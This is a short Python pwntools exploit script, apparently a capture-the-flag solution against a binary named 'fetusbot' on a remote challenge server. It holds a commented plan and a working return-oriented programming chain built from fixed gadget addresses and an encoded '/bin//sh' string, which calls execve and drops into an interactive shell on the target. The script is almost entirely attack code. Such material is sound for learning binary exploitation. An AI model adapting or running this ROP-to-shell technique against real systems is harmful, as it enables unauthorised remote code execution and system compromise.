from pwn import *

context.update(arch='amd64', os='linux')

# io = process("./fetusbot")
# io = remote("172.17.0.2",2000)
io = remote("0.cloud.chals.io",26925)

# gdb.attach(io, "b *0x1337120")


"""
idea:
(no need to set RAX, just send 59 bytes)
sar rsi, 63 		(zero rsi)
mov rdi, rsp 		(move rdi to stack)
add dil, 16 		(set rdi to bin/sh buffer)
jmp rcx 			(rcx = ret by default)
cdq 				(zero out rdx)
syscall 			(call sys_execve)
"""

ZERO_RSI = 0x1337081
MOV_RSP_RDI = 0x13370b8
ADD_RDI_JMP_RCX = 0x133705a
CDQ_SYS = 0x133700d

payload = p64(ZERO_RSI) + p64(1337) + p64(MOV_RSP_RDI) + p64(ADD_RDI_JMP_RCX) + p64(CDQ_SYS) + p64(0x68732f2f6e69622f) + p64(0) + b'aa\n'

io.send(payload)

# execute shell
io.interactive()

io.close()
